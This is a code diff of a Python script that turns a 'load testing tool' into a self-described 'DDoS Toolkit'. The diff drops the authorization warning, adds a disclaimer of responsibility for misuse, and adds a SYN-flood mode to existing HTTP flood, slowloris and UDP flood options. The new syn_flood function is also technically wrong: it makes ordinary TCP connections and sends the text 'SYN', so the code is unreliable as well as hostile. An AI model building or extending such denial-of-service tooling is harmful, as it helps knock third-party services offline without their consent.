@@ -1,37 +1,36 @@
 #!/usr/bin/env python3
 # Author: LIONMAD
+import aiohttp  # For making asynchronous HTTP requests
+import asyncio  # For handling asynchronous programming
+import time  # For measuring time intervals
+import argparse  # For parsing command-line arguments
+import threading  # For creating and managing threads
+from concurrent.futures import ThreadPoolExecutor, as_completed  # For thread pooling and managing tasks concurrently
+import random  # For generating random values
+import json  # For working with JSON data
+from itertools import cycle  # For cycling through an iterable indefinitely
+from collections import deque  # For efficient queue-like data structure
+from uuid import uuid4  # For generating unique identifiers (UUIDs)
+from base64 import b64encode  # For encoding data in Base64
+import hashlib  # For creating hash values (e.g., SHA256)
+import zlib  # For data compression and decompression
+import hmac  # For creating message authentication codes (MACs)
+import signal  # For handling OS signals like SIGINT
+import sys  # For interacting with the Python interpreter
+import os  # For interacting with the operating system
+import subprocess  # For spawning and managing subprocesses
+import socket  # For low-level networking
+import struct  # For working with C-style data structures
+import scapy.all as scapy  # For advanced packet manipulation and analysis
+import dns.resolver  # For resolving DNS queries
+import psutil  # For accessing system and process performance metrics
+import logging  # For logging messages and debugging
+from colorama import init, Fore, Style  # For adding colors to terminal output
+from tqdm import tqdm  # For creating progress bars
 
-import aiohttp
-import asyncio
-import time
-import argparse
-import threading
-import random
-import json
-import logging
-from colorama import init, Fore, Style
-from base64 import b64encode
-from itertools import cycle
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from collections import deque
-from uuid import uuid4
-import signal
-import sys
-import os
-import subprocess
-import hashlib
-import zlib
-import hmac
-from tqdm import tqdm
-import socket
-import struct
-import scapy.all as scapy
-import dns.resolver
-import psutil  # For performance monitoring
+# Initialize colorama for colorized terminal output
 
-# Initialize colorama
-init(autoreset=True)
-
+init(autoreset=True)  # Automatically reset color styles after each line
 # Colors
 RED = Fore.RED
 GREEN = Fore.GREEN
@@ -74,25 +73,18 @@ def display_banner():
     print(f"""
 {BLUE}
 ╔══════════════════════════════════════════════════════════╗
-║                                                          ║
-║               Advanced Load Testing Tool                 ║
-║                                                          ║
-║                      Version 1.4                         ║
-║                                                          ║
-║                  Coded By: LIONBAD                       ║
-║                                                          ║
+║                   DDoS Toolkit v1.3                      ║
+║                   Coded By LIONBAD                       ║
 ╠══════════════════════════════════════════════════════════╣
-║                                                          ║
-║   ⚠ Use this tool only for legitimate purposes. ⚠        ║
-║               ⚠ Obtain proper authorization. ⚠           ║
-║                                                          ║
+║    ⚠ The author is not responsible for any misuse. ⚠     ║
+║            ⚠  Use it at your own risk.. ⚠                ║
 ╚══════════════════════════════════════════════════════════╝
 {RESET}
 """)
 
 def parse_args():
     """Parse command-line arguments."""
-    parser = argparse.ArgumentParser(description="Load Testing Tool")
+    parser = argparse.ArgumentParser(description="DDoS Toolkit v1.3 Coded By LIONBAD")
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
@@ -102,7 +94,7 @@ def parse_args():
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
-    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood"], default="http-flood", help="Type of attack to perform")
+    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood"], default="http-flood", help="Type of attack to perform")
     parser.add_argument("--proxy-auth", help="Proxy authentication (username:password)")
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
     parser.add_argument("--user-agents", help="File containing custom user-agent strings")
@@ -219,6 +211,21 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
+def syn_flood(target_ip, target_port, duration):
+    """Perform a SYN flood attack."""
+    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendall(b"SYN")
+            s.close()
+        except Exception as e:
+            print(f"Error during SYN flood: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("SYN flood attack completed.")
+
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     """Display the status of the load test."""
     start_time = time.time()
@@ -289,9 +296,14 @@ async def main():
     stop_event = threading.Event()
     tasks = []
 
-    for _ in range(args.threads):
-        task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
-        tasks.append(task)
+    if args.attack_mode == "syn-flood":
+        target_ip = await resolve_target(target)
+        target_port = 80  # Default port for SYN flood
+        syn_flood(target_ip, target_port, args.duration)
+    else:
+        for _ in range(args.threads):
+            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
+            tasks.append(task)
 
     display_thread = threading.Thread(
         target=display_status, args=(stop_event, args.duration, args.results)
